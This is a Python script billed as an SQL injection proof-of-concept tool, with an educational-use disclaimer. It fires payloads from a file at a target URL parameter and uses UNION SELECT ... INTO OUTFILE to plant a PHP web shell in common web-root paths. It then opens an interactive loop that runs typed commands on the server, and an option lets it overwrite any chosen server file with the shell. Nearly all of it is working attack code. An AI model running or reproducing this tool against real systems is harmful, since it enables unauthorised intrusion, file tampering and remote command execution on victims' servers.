#!/usr/bin/env python3.11
import requests
import time
import argparse
import datetime

banner = """
SQL Injection Proof of Concept Tool
===================================
Author: J3r1ch0123
Version: 1.0
Disclaimer: This tool is for educational purposes only. Do not use it to attack any system without explicit permission from the system owner.
"""

def output(outfile, data):
    dt = datetime.datetime.now().isoformat()
    with open(outfile, "a") as theoutfile:
        theoutfile.write(f"{dt}:\t{data}")

def exploit(url, param, payload):
    full_url = f"{url}{param}{payload}"
    print(f"[+] Testing {payload.strip()} on {url}{param}")
    
    try:
        start = time.time()
        response = requests.get(full_url)
        end = time.time()

        response_time = end - start
        content_length = len(response.content)
        status_code = response.status_code
        text = response.text[:500]

        print(f"[+] Status code: {status_code}")
        print(f"[+] Content length: {content_length} bytes")
        print(f"[+] Response time: {response_time:.2f} seconds\n")
        
        if status_code == 200:
            output("output.txt", f"Status code: {status_code}\n")
            output("output.txt", f"URL: {url}\n")
            output("output.txt", f"Content Length: {content_length} bytes\n")
            output("output.txt", f"Response time: {response_time:.2f} seconds\n")
            output("output.txt", f"Payload used: {payload}\n\n")
            output("output.txt", f"Text: {text}\n\n")
        else:
            print(f"[-] Web request error: {status_code}...\n")
            return False

    except requests.RequestException as e:
        print(f"[-] Error occurred: {e}")
        with open("error.log", "a") as thelog:
            thelog.write(str(e) + "\n")
        return False

    return True

def overwrite_file(url, param, filepath):
    print(f"[+] Attempting to overwrite {filepath}...\n")
    payload = f"""' union select '<?php system($_GET["cmd"]);?>' into outfile '{filepath}' -- -"""

    if exploit(url, param, payload):
        print(f"[+] Successfully overwritten {filepath}...\n")
    else:
        print(f"[-] Failed to overwrite {filepath}...\n")

def shell_mode(url, param):
    print("[+] Attempting to upload shell to server...\n")
    paths = ['./', '/var/www/html/', '/var/www/', '/home/user/htdocs/', '/www/', '/public_html/', '/var/www/html/example.com/public_html/', '/usr/local/nginx/html/']
    
    for path in paths:
        payload = f"""' union select '<?php system($_GET["cmd"]);?>' into outfile '{path}shell.php' -- -"""
        if exploit(url, param, payload):
            print(f"[+] Webshell successfully uploaded to {path}shell.php. Entering shell mode...\n")
            web_shell = f"{url}/shell.php?cmd="
            while True:
                shell = input("$ ")
                full_url = web_shell + shell

                try:
                    response = requests.get(full_url)
                    print(response.text)
                    
                except requests.RequestException as e:
                    print(f"[-] Error: {e}\n")
                    break
            return
    print("[-] Webshell not uploaded. Check output.txt for analysis...")

def main():
    parser = argparse.ArgumentParser(description=banner)
    parser.add_argument("url", help="Vulnerable URL (e.g. https://example.com/vulnerable_uri)")
    parser.add_argument("payloads", default="payloads.txt", help="File containing payloads")
    parser.add_argument("--param", default="?id=2", help="Parameter to test (default: ?id=2)")
    parser.add_argument("--overwrite", help="Overwrite file on server with web shell")
    args = parser.parse_args()

    print(banner)
    url = args.url
    if not url.startswith("http"):
        url = f"https://{url}"

    if args.overwrite:
        overwrite_file(url, args.param, args.overwrite)

    payloads = []
    with open(args.payloads, "r") as thepayloads:
        for line in thepayloads:
            payloads.append(line.strip())

    for payload in payloads:
        exploit(url, args.param, payload)

    shell_mode(url, args.param)

if __name__ == "__main__":
    main()

